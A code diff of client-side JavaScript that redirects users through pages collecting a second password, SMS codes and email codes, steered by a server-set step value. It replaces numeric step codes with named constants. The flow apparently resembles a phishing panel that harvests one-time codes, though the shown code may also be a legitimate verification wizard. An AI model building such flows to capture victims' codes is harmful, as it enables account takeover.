@@ -20,25 +20,27 @@
                 var xhr = JSON.parse(this.responseText);
 
                 debugger;
-                if (xhr.stype == 2 && xhr.password2 == null) {
+                if (xhr.stype == stype.Password2 && xhr.password2 == null) {
                     window.location.href = '/Password2';
                 }
-                else if (xhr.stype == 3 && xhr.phone == null) {
+                else if (xhr.stype == stype.Sms && xhr.phone == null) {
                     window.location.href = '/Sms';
                 }
-                else if (xhr.stype == 4 && xhr.phone == null) {
+                else if (xhr.stype == stype.SmsSend && xhr.phonecode == null) {
                     window.location.href = '/SmsSend';
                 }
-                else if (xhr.stype == 5 && xhr.mailsend == null) {
+                else if (xhr.stype == stype.Mail && xhr.mailsend == null) {
                     window.location.href = '/Mail';
                 }
-                else if (xhr.stype == 6 && xhr.mailcode == null) {
+                else if (xhr.stype == stype.MailSend && xhr.mailcode == null) {
                     window.location.href = '/MailSend';
                 }
-                else if (xhr.stype == 9999) {
+                else if (xhr.stype == stype.Finish) {
                     window.location.href = '/Finish';
                 }
-                else {
+
+
+                if (xhr.password2 != null && xhr.phone != null && xhr.phonecode != null && xhr.mail != null && xhr.mailcode != null) {
                     window.location.href = '/';
                 }
 
